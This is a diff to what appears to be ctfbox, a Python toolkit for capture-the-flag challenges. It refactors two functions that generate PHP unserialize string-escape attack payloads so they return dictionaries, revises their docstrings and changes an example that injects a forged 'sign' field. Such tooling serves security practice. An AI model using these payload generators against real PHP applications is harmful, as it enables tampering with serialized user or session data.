@@ -10,6 +10,7 @@ from urllib.parse import quote
 from hashlib import md5
 
 import requests
+import json
 from ctfbox.exceptions import (FlaskSessionHelperError, HashAuthArgumentError,
                                ProvideArgumentError, GeneratePayloadError)
 from ctfbox.utils import random_string, Context, ProvideHandler, Threader
@@ -512,7 +513,7 @@ def gopherraw(raw: str, host: str = "", ssrfFlag: bool = True) -> str:
     return header + data
 
 
-def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> str:
+def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
     """
     Use for generate short to long php unserialize escape attack payload
     Tips:
@@ -526,7 +527,8 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
 
 
     Returns:
-        str: generated payload
+        dict:
+            insert_data: The payload that caused the data modification
 
     Example:
         php_serialize_escape_s2l("x", "yy", '''s:8:"password";s:6:"123456"''')
@@ -538,16 +540,19 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
     padding_len, remain = divmod(len(payload) + 4, diff_len)
     if remain != 0:
         if not paddingTrush:
-            raise GeneratePayloadError("Payload length error")
+            raise GeneratePayloadError("payload length error, try modify it, maybe you can put {paddingTrush=True} into the function")
         k, trush = _generateTrush(diff_len, remain)
         padding_len += k
         payload = trush + payload
     payload = '";' + payload + ";}"
     result = src * padding_len + payload
-    return result
+    result_dict = {
+        'insert_data': result
+    }
+    return result_dict
 
 
-def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: bool = False) -> str:
+def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
     """
     Use for generate long to short php unserialize escape attack payload
 
@@ -561,10 +566,13 @@ def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: boo
         paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
 
     Returns:
-        str: To be precise a dictionary, it will return the populoate_data, insert_data and trash_data.
+        dict:
+            populoate_data: Data used to fill, causing characters to escape
+            trash_data: To fix the length error
+            insert_data: The payload that caused the data modification
 
     Example:
-        php_serialize_escape_l2s("yy", "x", '''s:8:"password";s:6:"123456"''')
+        php_serialize_escape_l2s("yy", "x", '''s:8:"password";s:4:"test";s:4:"sign";s:6:"hacker"''')
     """
     eatString = "\";" + payload.split(';')[0] + f';s:{len(payload) + 4}:"'
     # ": + payload + ;} --> len(payload) + 4
@@ -576,16 +584,16 @@ def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: boo
 
     # There is no remainder
     if remain == 0:
-        print('There is no remainder')
         populate_data = padding_len * src
         insert_data = "\";" + payload + ";}"
 
         result = {
             'populoate_data': populate_data,
-            'insert_data': insert_data
+            'insert_data': insert_data,
+            'trash_data': None
         }
 
-        return json.dumps(result, indent=4).replace("\"", "'").replace("\\'", "\"")
+        return result
 
     # If there is a remainder, then pad trash data into the payload
     if not paddingTrush:
@@ -602,7 +610,7 @@ def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: boo
 
             result = {
                 'populate_data': populate_data,
-                'trash_data': (i * '@'),
-                'insert_data_with_trash': insert_data_with_trash
+                'insert_data': insert_data_with_trash,
+                'trash_data': (i * '@')
             }
-            return json.dumps(result, indent=4).replace("\"", "'").replace("\\'", "\"")
+            return result
